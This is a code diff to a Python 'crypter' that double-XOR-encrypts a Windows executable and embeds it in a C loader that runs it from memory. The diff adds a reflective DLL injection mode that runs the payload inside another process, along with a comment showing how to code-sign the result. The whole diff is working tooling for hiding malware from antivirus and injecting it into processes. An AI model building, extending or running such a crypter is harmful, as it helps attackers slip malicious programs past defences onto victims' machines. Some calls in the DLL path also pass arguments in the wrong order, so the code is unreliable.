@@ -10,10 +10,18 @@ version     = "0.1"
 FILETYPE    = None
 PE_IMAGE    = None
 OUT_NAME    = None
-CRYPTKEY    = None
+CRYPTKEY1   = None
+CRYPTKEY2   = None
 BINASRAW    = False
 NULLBKEY    = None
 UPXPACK     = False
+RUNASDLL    = False
+DLLIMAGE    = None
+
+"""
+sudo apt install osslsigncode
+osslsigncode sign -certs certs/cert.pem -key certs/key.pem -pass password -n "Application" -i http://www.google.com/ -in binary.exe -out binary-signed.exe
+"""
 
 def gen_rand_filename():
     name = ""
@@ -22,27 +30,30 @@ def gen_rand_filename():
     return name
 
 def gen_rand_key():
-    global CRYPTKEY, NULLBKEY
-    CRYPTKEY = random.randint(100, 999)
-    print(f"[+] Using key {hex(CRYPTKEY)}")
+    global CRYPTKEY1, CRYPTKEY2, NULLBKEY
+    CRYPTKEY1 = random.randint(10, 100)
+    CRYPTKEY2 = random.randint(10, 100)
+    print(f"[+] Using keys {hex(CRYPTKEY1)}, {hex(CRYPTKEY2)}")
 
 def gen_null_key():
     global NULLBKEY
     NULLBKEY = random.randint(17, 50)
     print(f"[+] Using null key {hex(NULLBKEY)}")
 
-def get_file_as_hex(infile):
+def get_file_as_hex(crypt, key, infile=None, data=None, data_length=None):
     bytes = ""
-    with open(infile, "rb") as file:
-        data = file.read()
-        data_len = len(data)
+    if (infile != None) and (data == None):
+        with open(infile, "rb") as file:
+            data = file.read()
+            data_len = len(data)
+    else:
+        data_len = data_length
     iter = 0
     for num, byte in enumerate(data):
         byte = hex(byte)
-        if byte == hex(0x00):
-            byte = hex(NULLBKEY)
+        if crypt:
+            byte = hex(int(byte, 16) ^ key)
         else:
-            byte = hex(int(byte, 16) ^ CRYPTKEY)
             if len(str(byte)) == 3:
                 byte = str(byte).replace("0x", '')
                 byte = f"0x0{byte}"
@@ -70,14 +81,15 @@ def write_pe_image():
 
 def write_header_file():
     with open("lib/main.h", "w") as file:
-        HEADFILE =  f"#define key {hex(CRYPTKEY)}\n"
+        HEADFILE =   f"#define key_one {hex(CRYPTKEY1)}\n"
+        HEADFILE +=  f"#define key_two {hex(CRYPTKEY2)}\n"
         HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
-        HEADFILE += "void RunFromMemory(char* pImage, char* pPath);"
+        HEADFILE +=  "void RunFromMemory(char* pImage, char* pPath);"
         file.write(HEADFILE)
 
-def compile():
+def compile_as_binary():
     global OUT_NAME
-    os.system(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/main.cpp -o {OUT_NAME} -static")
+    os.system(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/pe_main.cpp -o {OUT_NAME} -static")
 
 def strip_bin(infile):
     os.system(f"strip {infile} > /dev/null")
@@ -94,21 +106,80 @@ def pack_with_upx(file):
     print(f"[+] Packed {file} with upx, stored it in {name}")
     return name
 
+def compile_as_dll():
+    file = gen_rand_filename() + ".dll"
+    reflect = "lib/ReflectiveDLLInjection/dll/"
+    cmd = f"i686-w64-mingw32-g++ lib/dll_main.c {reflect}ReflectiveLoader.c lib/exec_memory.cpp -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
+    os.system(cmd)
+    return file
+
+def write_dll_image():
+    with open("lib/dll_image.h", "w") as file:
+        file.write(DLLIMAGE)
+
+def prepare_dll_image(bytes_len, hex_bytes):
+    global DLLIMAGE
+    DLLIMAGE =  f"#define array_len {bytes_len}\n\n"
+    DLLIMAGE += "unsigned char *dll_image[] = {\n"
+    DLLIMAGE += hex_bytes
+    DLLIMAGE += "\n};"
+
+def compile_dll_loader_as_pe():
+    global OUT_NAME
+    reflect_inject = "lib/ReflectiveDLLInjection/inject/"
+    sources = f"{reflect_inject}GetProcAddressR.c {reflect_inject}LoadLibraryR.c"
+    flags = "-O2 -DWIN_X86 -static -lwtsapi32 -w"
+
+    cmd = f"i686-w64-mingw32-gcc {sources} lib/dll_mem_exec.c -o {OUT_NAME} {flags}"
+    os.system(cmd)
+
+def clean_file(file):
+    os.unlink(file)
+
 def crypt(infile):
     print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")
+
     if UPXPACK:
         infile = pack_with_upx(infile)
     else:
         length = strip_bin(infile)
         print(f"[+] Stripped {infile} down to {length} bytes")
+
     gen_null_key()
-    hex_bytes, bytes_len = get_file_as_hex(infile)
+    hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
+
+    raw_crypt_bytes = b""
+    for byte in hex_bytes.split():
+        byte = byte.replace("0x", '')
+        byte = byte.replace(",", '')
+        if len(byte) == 1:
+            byte = f"0{byte}"
+        try:
+            raw_crypt_bytes += bytes.fromhex(byte).encode('utf-8')
+        except AttributeError:
+            raw_crypt_bytes += bytes.fromhex(byte)
+
+    hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)
     prepare_pe_image(bytes_len, hex_bytes)
     write_pe_image()
     print("[+] Extracted bytes and created pe image")
     write_header_file()
-    compile()
-    print(f"[*] Wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
+
+    if RUNASDLL is False:
+        compile_as_binary()
+        if UPXPACK is True:
+            clean_file(infile)
+        print(f"[*] Wrote {get_size(OUT_NAME)} bytes to PE {OUT_NAME}")
+    elif RUNASDLL is True:
+        dll_file = compile_as_dll()
+        print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
+        hex_bytes, bytes_len = get_file_as_hex(dll_file, False, None)
+        prepare_dll_image(bytes_len, hex_bytes)
+        write_dll_image()
+        compile_dll_loader_as_pe()
+        print(f"[*] Compiled the dll loader and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
+
+
 
 if __name__ == '__main__':
     ap = argparse.ArgumentParser()
@@ -118,6 +189,7 @@ if __name__ == '__main__':
     ap.add_argument("file", help="file to crypt, assumed as binary if not told otherwise")
     ap.add_argument("-u", "--upx", required=False, action='store_true', help="upx file before crypting")
     ap.add_argument("-b", "--binary", required=False, action='store_true', help="provide if file is a binary exe")
+    ap.add_argument("-d", "--dll", required=False, action='store_true', help="use reflective dll injection to execute the binary inside another process")
     ap.add_argument("-s", "--source", required=False, action='store_true', help="provide if the file is c source code")
     ap.add_argument("-r", "--raw", required=False, action='store_true', help="store binary in memory without encrypting")
     ap.add_argument("-k", "--key", required=False, help="key to encrypt with, randomly generated if not supplied")
@@ -137,11 +209,12 @@ if __name__ == '__main__':
         OUT_NAME = args['outfile']
 
     if args['key'] is not None:
-        CRYPTKEY = hex(args['key'])
+        CRYPTKEY1 = hex(args['key'])
     else:
         gen_rand_key()
 
     if args['raw'] is not False: BINASRAW = True
     if args['upx'] is not False: UPXPACK = True
+    if args['dll'] is not False: RUNASDLL = True
 
     crypt(args['file'])
